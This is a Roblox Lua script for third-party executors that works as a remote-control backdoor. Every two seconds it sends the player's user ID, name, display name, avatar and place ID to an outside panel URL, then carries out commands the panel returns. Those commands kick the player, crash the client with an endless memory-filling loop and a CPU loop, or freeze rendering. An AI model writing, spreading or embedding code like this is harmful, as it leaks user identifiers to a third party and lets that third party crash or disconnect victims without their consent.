-- ==== Panel Controller (فوق كل شي) ====
local PANEL_URL = "https://bypass-buddy-hub.lovable.app/api/public/script/poll"
local HttpService = game:GetService("HttpService")
local Players     = game:GetService("Players")
local RunService  = game:GetService("RunService")
local LP = Players.LocalPlayer or Players:GetPropertyChangedSignal("LocalPlayer"):Wait() or Players.LocalPlayer

local function req(opts)
    local fn = (syn and syn.request) or (http and http.request) or http_request
        or (fluxus and fluxus.request) or request
    return fn(opts)
end

local function post(body)
    local ok, res = pcall(req, {
        Url = PANEL_URL, Method = "POST",
        Headers = {["Content-Type"]="application/json"},
        Body = HttpService:JSONEncode(body),
    })
    if not ok or not res or not res.Body then return nil end
    local ok2, data = pcall(function() return HttpService:JSONDecode(res.Body) end)
    if ok2 then return data end
end

-- FPS control
local fpsConn, origCap
local function fpsLow()
    if setfpscap then pcall(setfpscap, 1) end
    if fpsConn then fpsConn:Disconnect() end
    -- fallback: freeze render step
    fpsConn = RunService.RenderStepped:Connect(function()
        local t = tick() + 1
        while tick() < t do end
    end)
end
local function fpsRestore()
    if setfpscap then pcall(setfpscap, 240) end
    if fpsConn then fpsConn:Disconnect() fpsConn = nil end
end

local function doKick()
    pcall(function() LP:Kick("Kicked by panel") end)
end

local function doCrash()
    -- عدة طرق حتى تشتغل
    pcall(function() LP:Kick("crash") end)
    task.spawn(function()
        local t = {}
        while true do table.insert(t, string.rep("x", 1e6)) end
    end)
    task.spawn(function() while true do end end)
end

local handlers = {
    crash = doCrash, kick = doKick,
    fps_low = fpsLow, fps_restore = fpsRestore,
}

task.spawn(function()
    while task.wait(2) do
        local uid = tostring(LP.UserId)
        local avatar = "https://www.roblox.com/headshot-thumbnail/image?userId="..uid.."&width=150&height=150&format=png"
        local data = post({
            roblox_user_id = uid,
            username = LP.Name,
            display_name = LP.DisplayName,
            avatar_url = avatar,
            place_id = tostring(game.PlaceId),
        })
        if data and data.commands then
            for _, cmd in ipairs(data.commands) do
                local h = handlers[cmd]; if h then pcall(h) end
            end
        end
    end
end)
